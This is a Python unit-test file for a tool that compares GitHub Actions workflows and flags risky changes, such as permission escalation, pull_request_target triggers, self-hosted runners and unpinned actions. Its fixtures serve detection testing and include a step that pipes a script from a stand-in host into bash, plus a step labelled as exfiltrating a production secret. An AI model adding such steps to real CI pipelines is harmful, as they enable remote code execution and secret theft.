"""Comprehensive unit tests for the Structural Comparison Engine.

Tests cover all 10 comparison categories:
1. Job additions and removals
2. Job configuration changes (timeouts, continue-on-error)
3. Permission changes (broad write, OIDC id-token, scope reductions)
4. Trigger modifications (pull_request_target, workflow_dispatch, removed triggers)
5. Runner changes (GitHub-hosted to self-hosted)
6. Dependency changes (needs added, removed, or bypassed)
7. Step additions, removals, and modifications (curl|bash, secrets, run command edits)
8. Action changes and version pinning degradation (SHA to tag, third-party swap)
9. Deployment environment changes
10. Reusable workflow changes
11. Identical workflow zero-diff invariance
12. End-to-end verification across authentic dataset pairs
"""

import os
import pytest

from backend.app.comparator import (
    ChangeCategory,
    ChangeSeverity,
    ComparisonResult,
    compare_workflows,
)
from backend.app.parser import parse_workflow

ROOT_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
DATASET_DIR = os.path.join(ROOT_DIR, "dataset")


def test_identical_workflows_produce_zero_differences():
    """Verify that comparing identical workflows returns zero changes."""
    yaml_text = """
    name: Identical CI
    on: push
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
          - run: echo build
    """
    res = compare_workflows(yaml_text, yaml_text)
    assert isinstance(res, ComparisonResult)
    assert res.summary.total_changes == 0
    assert len(res.differences) == 0
    assert res.summary.has_critical_or_high_changes is False


def test_job_addition_and_removal():
    """Verify detection of newly added and deleted jobs."""
    base_yaml = """
    name: CI
    on: push
    jobs:
      lint:
        runs-on: ubuntu-latest
        steps:
          - run: flake8
      test:
        runs-on: ubuntu-latest
        steps:
          - run: pytest
    """
    mod_yaml = """
    name: CI
    on: push
    jobs:
      test:
        runs-on: ubuntu-latest
        steps:
          - run: pytest
      telemetry:
        runs-on: ubuntu-latest
        steps:
          - run: echo telemetry
    """
    res = compare_workflows(base_yaml, mod_yaml)
    assert res.summary.jobs_added == 1
    assert res.summary.jobs_removed == 1

    cats = [d.category for d in res.differences]
    assert ChangeCategory.JOB_ADDITION in cats
    assert ChangeCategory.JOB_REMOVAL in cats

    added = [d for d in res.differences if d.category == ChangeCategory.JOB_ADDITION][0]
    assert added.location == "jobs.telemetry"

    removed = [d for d in res.differences if d.category == ChangeCategory.JOB_REMOVAL][0]
    assert removed.location == "jobs.lint"


def test_job_configuration_changes():
    """Verify detection of altered timeouts and continue-on-error settings."""
    base_yaml = """
    name: CI
    on: push
    jobs:
      build:
        runs-on: ubuntu-latest
        timeout-minutes: 10
        continue-on-error: false
        steps:
          - run: make
    """
    mod_yaml = """
    name: CI
    on: push
    jobs:
      build:
        runs-on: ubuntu-latest
        timeout-minutes: 60
        continue-on-error: true
        steps:
          - run: make
    """
    res = compare_workflows(base_yaml, mod_yaml)
    cfg_diffs = [d for d in res.differences if d.category == ChangeCategory.JOB_CONFIGURATION]
    assert len(cfg_diffs) == 2

    locations = [d.location for d in cfg_diffs]
    assert "jobs.build.timeout-minutes" in locations
    assert "jobs.build.continue-on-error" in locations


def test_permission_changes():
    """Verify broad write escalation, OIDC token minting, and permission hardening."""
    base_yaml = """
    name: Permissions Baseline
    on: push
    permissions:
      contents: read
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - run: make
    """
    # 1. Broad write escalation
    mod_broad = """
    name: Permissions Baseline
    on: push
    permissions: write-all
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - run: make
    """
    res1 = compare_workflows(base_yaml, mod_broad)
    perm_diffs1 = [d for d in res1.differences if d.category == ChangeCategory.PERMISSION_CHANGE]
    assert len(perm_diffs1) >= 1
    assert any(d.severity == ChangeSeverity.HIGH for d in perm_diffs1)
    assert any("write-all" in d.description for d in perm_diffs1)

    # 2. OIDC token write escalation at job level
    mod_oidc = """
    name: Permissions Baseline
    on: push
    permissions:
      contents: read
    jobs:
      build:
        runs-on: ubuntu-latest
        permissions:
          id-token: write
        steps:
          - run: make
    """
    res2 = compare_workflows(base_yaml, mod_oidc)
    perm_diffs2 = [d for d in res2.differences if d.category == ChangeCategory.PERMISSION_CHANGE]
    assert len(perm_diffs2) >= 1
    assert any("id-token" in d.location and d.severity == ChangeSeverity.HIGH for d in perm_diffs2)


def test_trigger_modifications():
    """Verify pull_request_target, workflow_dispatch, and removed triggers."""
    base_yaml = """
    name: Trigger Baseline
    on: [push, pull_request]
    jobs:
      b:
        runs-on: ubuntu-latest
        steps:
          - run: echo ok
    """
    # Replace PR with pull_request_target
    mod_yaml = """
    name: Trigger Baseline
    on: [push, pull_request_target, workflow_dispatch]
    jobs:
      b:
        runs-on: ubuntu-latest
        steps:
          - run: echo ok
    """
    res = compare_workflows(base_yaml, mod_yaml)
    assert res.summary.triggers_changed == 3  # added pr_target, added dispatch, removed pull_request

    pr_target_diff = [d for d in res.differences if d.location == "on.pull_request_target"][0]
    assert pr_target_diff.severity == ChangeSeverity.HIGH
    assert "PwnRequest" in pr_target_diff.description


def test_runner_changes():
    """Verify migration from GitHub-hosted to self-hosted runners."""
    base_yaml = """
    name: Runner Baseline
    on: push
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - run: make
    """
    mod_yaml = """
    name: Runner Baseline
    on: push
    jobs:
      build:
        runs-on: [self-hosted, linux, x64]
        steps:
          - run: make
    """
    res = compare_workflows(base_yaml, mod_yaml)
    assert res.summary.runners_changed == 1
    runner_diff = [d for d in res.differences if d.category == ChangeCategory.RUNNER_CHANGE][0]
    assert runner_diff.severity == ChangeSeverity.HIGH
    assert "private host infrastructure" in runner_diff.description


def test_dependency_changes():
    """Verify removal of dependency gate triggers HIGH severity."""
    base_yaml = """
    name: Dep Baseline
    on: push
    jobs:
      security-scan:
        runs-on: ubuntu-latest
        steps:
          - run: snyk test
      deploy:
        needs: security-scan
        runs-on: ubuntu-latest
        steps:
          - run: ./deploy.sh
    """
    mod_yaml = """
    name: Dep Baseline
    on: push
    jobs:
      security-scan:
        runs-on: ubuntu-latest
        steps:
          - run: snyk test
      deploy:
        runs-on: ubuntu-latest
        steps:
          - run: ./deploy.sh
    """
    res = compare_workflows(base_yaml, mod_yaml)
    assert res.summary.dependencies_changed == 1
    dep_diff = [d for d in res.differences if d.category == ChangeCategory.DEPENDENCY_CHANGE][0]
    assert dep_diff.severity == ChangeSeverity.HIGH
    assert "security-scan" in dep_diff.description


def test_step_addition_removal_and_network_shell():
    """Verify added step with curl|bash, removed steps, and secret references."""
    base_yaml = """
    name: Step Baseline
    on: push
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - name: Checkout
            uses: actions/checkout@v4
          - name: Build
            run: make build
    """
    mod_yaml = """
    name: Step Baseline
    on: push
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - name: Checkout
            uses: actions/checkout@v4
          - name: Injected Shell
            run: curl -fsSL https://untrusted.cdn/setup.sh | bash
          - name: Exfil Secret
            env:
              KEY: ${{ secrets.PROD_API_KEY }}
            run: echo "test"
    """
    res = compare_workflows(base_yaml, mod_yaml)
    assert res.summary.steps_added >= 2
    assert res.summary.steps_removed >= 1  # Build was removed

    curl_diff = [d for d in res.differences if "curl" in d.description.lower()][0]
    assert curl_diff.severity == ChangeSeverity.HIGH
    assert "curl | bash" in curl_diff.description


def test_action_pinning_degradation_and_third_party():
    """Verify detection of SHA pinning degradation and third-party action swap."""
    base_yaml = """
    name: Action Baseline
    on: push
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - name: Pinned Setup
            uses: actions/setup-node@b4ffde65f46336ab88eb53be808477a3936bae11
    """
    mod_yaml = """
    name: Action Baseline
    on: push
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - name: Pinned Setup
            uses: community-contrib/setup-node@master
    """
    res = compare_workflows(base_yaml, mod_yaml)
    assert res.summary.actions_changed >= 1
    act_diff = [d for d in res.differences if d.category == ChangeCategory.ACTION_CHANGE][0]
    assert act_diff.severity in (ChangeSeverity.HIGH, ChangeSeverity.MEDIUM)
    assert "unpinned third-party" in act_diff.description or "pinning degraded" in act_diff.description.lower()


def test_environment_and_reusable_workflow_changes():
    """Verify target environment and reusable workflow call differences."""
    base_yaml = """
    name: Env Baseline
    on: push
    jobs:
      deploy:
        runs-on: ubuntu-latest
        steps:
          - run: echo deploy
    """
    mod_yaml = """
    name: Env Baseline
    on: push
    jobs:
      deploy:
        runs-on: ubuntu-latest
        environment: production
        uses: org/shared-repo/.github/workflows/deploy.yml@v1
        steps: []
    """
    res = compare_workflows(base_yaml, mod_yaml)
    categories = [d.category for d in res.differences]
    assert ChangeCategory.ENVIRONMENT_CHANGE in categories
    assert ChangeCategory.REUSABLE_WORKFLOW_CHANGE in categories


def test_dataset_pairs_comparison():
    """Verify that comparing our authentic dataset workflows against their anomalous variants yields findings."""
    normal_dir = os.path.join(DATASET_DIR, "normal")
    anomalous_dir = os.path.join(DATASET_DIR, "anomalous")

    pairs = [
        ("flask_tests.yaml", "flask_tests_perm_broad.yaml", ChangeCategory.PERMISSION_CHANGE),
        ("flask_tests.yaml", "flask_tests_runner_selfhosted.yaml", ChangeCategory.RUNNER_CHANGE),
        ("uvicorn_main.yaml", "uvicorn_trigger_pr_target.yaml", ChangeCategory.TRIGGER_CHANGE),
        ("uvicorn_main.yaml", "uvicorn_shell_curl_pipe.yaml", ChangeCategory.STEP_ADDITION),
        ("sampleproject_test.yaml", "sampleproject_job_addition.yaml", ChangeCategory.JOB_ADDITION),
        ("actions_checkout_test.yaml", "actions_checkout_unpinned_action.yaml", ChangeCategory.ACTION_CHANGE),
        ("gh_cli_lint.yaml", "gh_cli_lint_dep_tampering.yaml", ChangeCategory.JOB_ADDITION),
        ("requests_run_tests.yaml", "requests_secret_leak_env.yaml", ChangeCategory.STEP_MODIFICATION),
        ("pytest_test.yaml", "pytest_test_gate_removal.yaml", ChangeCategory.JOB_REMOVAL),
        ("docker_ci.yaml", "docker_ci_oidc_privilege.yaml", ChangeCategory.PERMISSION_CHANGE),
        ("express_ci.yaml", "express_ci_untrusted_reusable.yaml", ChangeCategory.JOB_ADDITION),
        ("curl_linux.yaml", "curl_linux_arbitrary_dispatch.yaml", ChangeCategory.TRIGGER_CHANGE),
        ("starter_python_package.yaml", "starter_python_perm_escalation.yaml", ChangeCategory.PERMISSION_CHANGE),
        ("fastapi_test.yaml", "fastapi_test_network_exfil.yaml", ChangeCategory.STEP_ADDITION),
        ("pip_ci.yaml", "pip_ci_runner_pool.yaml", ChangeCategory.RUNNER_CHANGE),
    ]

    for norm_file, anom_file, expected_cat in pairs:
        norm_path = os.path.join(normal_dir, norm_file)
        anom_path = os.path.join(anomalous_dir, anom_file)

        assert os.path.exists(norm_path), f"Missing {norm_file}"
        assert os.path.exists(anom_path), f"Missing {anom_file}"

        with open(norm_path, "r", encoding="utf-8") as f:
            base_content = f.read()
        with open(anom_path, "r", encoding="utf-8") as f:
            anom_content = f.read()

        result = compare_workflows(base_content, anom_content)
        assert result.summary.total_changes > 0, f"No changes found for pair {norm_file} -> {anom_file}"
        categories = [d.category for d in result.differences]
        assert expected_cat in categories, (
            f"Expected {expected_cat} in differences for {norm_file} -> {anom_file}, got {categories}"
        )
